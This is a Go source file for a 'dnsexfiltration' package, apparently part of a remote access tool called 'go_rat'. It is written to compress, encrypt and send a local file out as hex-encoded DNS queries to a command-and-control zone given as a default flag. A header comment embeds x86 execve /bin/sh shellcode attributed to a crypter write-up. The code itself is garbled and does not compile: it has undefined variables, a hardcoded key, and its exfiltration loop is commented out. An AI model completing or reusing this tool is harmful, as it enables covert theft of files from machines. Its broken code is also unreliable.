/*/
// Copyright 2012 The Go Authors. All rights reserved.
// Use of this source code is governed by a BSD-style
// license that can be found in the LICENSE file.

Uses code from:
https://snowscan.io/custom-crypter/

	// execve shellcode /bin/sh
	in := []byte{
		0xeb, 0x1a, 0x5e, 0x31, 0xdb, 0x88, 0x5e, 0x07,
		0x89, 0x76, 0x08, 0x89, 0x5e, 0x0c, 0x8d, 0x1e,
		0x8d, 0x4e, 0x08, 0x8d, 0x56, 0x0c, 0x31, 0xc0,
		0xb0, 0x0b, 0xcd, 0x80, 0xe8, 0xe1, 0xff, 0xff,
		0xff, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68,
		0x41, 0x42, 0x42, 0x42, 0x42, 0x43, 0x43, 0x43,
		0x43}

	out := make([]byte, len(in))

	// Generate a random 24 bytes nonce
	nonce := make([]byte, 24)
	if _, err := rand.Read(nonce); err != nil {
		panic(err)
	}

It is the caller's responsibility to ensure the uniqueness of nonces—for
example, by using nonce 1 for the first message, nonce 2 for the second
message, etc. Nonces are long enough that randomly generated nonces have
negligible risk of collision.

Messages should be small because:
	1. The whole message needs to be held in memory to be processed.

	2. Using large messages pressures implementations on small machines to decrypt
		and process plaintext before authenticating it. This is very dangerous, and
		this API does not allow it, but a protocol that uses excessive message sizes
		might present some implementations with no other choice.

var	3. Fixed overheads will be sufficiently amortised by messages as small as 8KB.

	4. Performance may be improved by working with messages that fit into data caches.
		Thus large amounts of data should be chunked so that each message is small.
		(Each message still needs a unique nonce.) If in doubt, 16KB is a reasonable
		chunk size.
/*/

package dnsexfiltration

import (
	"bufio"
	"bytes"
	"compress/zlib"
	"crypto/rand"
	"crypto/sha256"
	"flag"
	"fmt"
	"go_rat/pkg/shared_code/ErrorHandling"
	"io"
	"math/big"
	"net"
	"os"

	log "github.com/sirupsen/logrus"

	"github.com/fatih/color"
	"github.com/miekg/dns"
	"golang.org/x/crypto/chacha20poly1305"
)

// bytes per read operation
var FILEREADSPEED int = 36

// use this to start the logger, cant keep it in globals.go
// returns 0 if failure to open logfile, returns 1 otherwise
// uses code from :
// https://esc.sh/blog/golang-logging-using-logrus/
func StartLogger(logfile string) (return_code int) {
	Logs, derp := os.OpenFile(logfile, os.O_WRONLY|os.O_APPEND|os.O_CREATE, 0644)
	LoggerInstance := log.New()
	Formatter := new(log.TextFormatter)
	Formatter.ForceColors = true
	Formatter.FullTimestamp = true
	Formatter.TimestampFormat = "02-01-2006 15:04:05"
	LoggerInstance.SetFormatter(Formatter)
	if derp != nil {
		// Cannot open log file. Logging to stderr
		ErrorPrinter(derp, "[-] ERROR: Failure To Open Logfile!")
		return 0
	} else {
		log.SetOutput(Logs)
	}
	return 1
}

// use this instead of the regular logging functions
// ONLY use for errors!
// returns the errors but adds them to a log while printing a
// message to the screen for your viewing pleasure
func ErrorPrinter(derp error, message string) error {
	// output is being redirected to a file so we have to print as well
	log.Error(message)
	color.Red(message)
	return derp
}

// shows entries from the logfile, starting at the bottom
// limit by line number, loglevel, or time
func ShowLogs(LinesToPrint int, loglevel string, time string) {
	// set log thingie to use json so our json file
	// can be used
	log.SetFormatter(&log.JSONFormatter{})
	//switch loglevel{
	//	case "error":
	//		log.ErrorLevel

}

// debugging feedback function
// prints colored text for easy visual identification of data
// color_int (1,red)(2,green)(3,blue)(4,yellow)
func Debug_print(color_int int8, message string) {
	//if color_int
	switch color_int {
	//is 1
	case 1:
		color.Red(message)
		// and so on
	case 2:
		color.Blue(message)
	case 3:
		color.Green(message)
	case 4:
		color.Yellow(message)
	}
}

// function to use zlib to compress a byte array
func ZCompress(input []byte) (herp bytes.Buffer, derp error) {
	var b bytes.Buffer
	// feed the writer a buffer
	w := zlib.NewWriter(&b)
	// and the Write method will copy data to that buffer
	// in this case, the input we provide gets copied into the buffer "b"
	w.Write(input)
	// and then we close the connection
	w.Close()
	// and copy the buffer to the output
	//copy(herp, b.Bytes())
	return herp, derp
}
func ZDecompress(DataIn []byte) (DataOut []byte) {
	var buff []byte
	b := bytes.NewReader(buff)
	r, derp := zlib.NewReader(b)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	Copy(DataOut, r)
	r.Close()
	return DataOut
}

func OpenFile(filename) (fileobject []io.ByteReader) {
	// open the file
	herp, derp := os.Open(*filepath)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "[-] Could not open File")
	}
	defer func() {
		if derp = herp.Close(); derp != nil {
			ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
		}
	}()
	reader := bufio.NewReader(f)
	buffer := make([]byte, FILEREADSPEED)
	for {
		herp, derp := r.Read(b)
		if derp != nil {
			ErrorHandling.ErrorPrinter(derp, "[-] Could not read from file")
			break
		}
	}

	return fileobject
}

// This function creates a nonce with the bit size set
// by setting the chacha20poly1305.NonceSizeX variable
func NonceGenerator() (nonce []byte, derp error) {
	//var n *big.Int
	bitsize := big.NewInt(24)
	//nonce = make([]byte, 24)
	nonce = make([]byte, chacha20poly1305.NonceSizeX)
	// make random 24 bit prime number
	n, derp := rand.Int(rand.Reader, bitsize)
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	//copy number into buffer
	// after converting bigint to byte with internal method
	copy(nonce, n.Bytes())
	return nonce, derp
}

// makes chunky data for packet stuffing
// chunk size known, number of packets unknown
func DataChunkerChunkSize(DataIn []byte, chunkSize int) [][]byte { //, derp error) {
	//var chunkcount int = 1
	var DataInLength = len(DataIn)
	// make the buffer
	DataOutBuffer := make([][]byte, DataInLength)
	// loop over the original data object taking a bite outta crim... uh data
	for asdf := 1; asdf < DataInLength; asdf += chunkSize { //chunkcount++{
		// mark the end bounds
		//asdf= 2 ; end = 52? wat
		end := asdf + chunkSize
		// necessary check to avoid slicing beyond
		// slice capacity
		if end > DataInLength {
			end = DataInLength
		}
		DataOutBuffer = append(DataOutBuffer, DataIn[asdf:chunkSize])

	}

	return DataOutBuffer
	//maybe return chunk_num int as well
}

// This function uses the Salsa20 to encrypt a byte field
// with a variable sized nonce
func ChaChaLovesBytes(bytes_in []byte, EncryptionKey []byte, nonce []byte) (Salsa []byte, derp error) {
	var key [32]byte
	DataOut := make([]byte, len(bytes_in))
	if derp != nil {
		ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
	}
	// I was advised not to make my own unless I was a professional mathermind
	// this is the easy cheater way, use someone elses work

	pass := "Hello"
	msg := "Pass"

	key := sha256.Sum256([]byte(pass))
	herp, derp := chacha20poly1305.NewX(key[:])

	if pass == "" {
		a := make([]byte, 32)
		copy(key[:32], a[:32])
		aead, _ = chacha20poly1305.NewX(a)
	}
	if msg == "" {
		a := make([]byte, 32)
		msg = string(a)

	}

	nonce := make([]byte, chacha20poly1305.NonceSizeX)

	HaChaChaCha := aead.Seal(nil, nonce, []byte(msg), nil)

	plaintext, _ := aead.Open(nil, nonce, ciphertext, nil)

	copy(DataOut, HaChaChaCha)
	for _, element := range out {
		// original code treated this like a nullbyte but wat?
		if element == 0 {
			ErrorHandling.ErrorPrinter(derp, "generic error, fix me plz lol <3!")
			//return
		}
	}
	return DataOut, derp
}
func sendDNSmessage(MsgAsHexStr string, DestZone string) {
	var debug bool = true
	//a unique marker to identify the file in the dns logs
	var marker string = "herpAderpNotAPerp"
	// the dns zone to send the queries to.
	hostname := fmt.Sprintf("%d.%s.1.%s.%s", marker, MsgAsHexStr, DestZone)
	herp, derp := net.LookupIP(hostname)
	fmt.Printf("%d\n", chunk)
	if debug {
		fmt.Printf("Data Length: %d\n")
		fmt.Printf("Error: %s\n", derp)
		fmt.Printf("--------------------------\n")
	}

}
func DnsReceiver() {
	dns.Server.Listener()
}

// main function
// Exports a sequence of bytes via DNS packets
// max message size is 512 bytes
func DNSExfiltration(ByteArrayInput []byte, DestZone string, MaxMsgSize int) (herp, derp error) {
	//var debug bool = true
	MaxMsgSize = 512 // bytes
	//chunksofdata := DataChunkerChunkSize(ByteArrayInput, MaxMsgSize)

	//for thing in chunksofdata {
	//	hexString := hex.EncodeToString(dataBytes)
	//	sendDNSmessage(hexString, DestZone)
	//}

}

// only used for parsing arguments
func main() {
	var debug = flag.Bool("d", false, "enable debugging.")
	var file = flag.String("file", "", "the local file to exfiltrate.")
	var logfile = flag.String("logfile", "", "logfile")
	var help = flag.Bool("help", false, "show help.")
	var DerpKey = flag.String("key", "Herp-Key-Derp")
	var CommandCenter = flag.String("Command Center", "hakcbiscuits.firewall-gateway.netyinski", "the dns zone (homebase) to send the queries to.")

	flag.Parse()

	if *help || len(os.Args) == 1 {
		flag.PrintDefaults()
		return
	}
	fileobject := OpenFile(file)

}
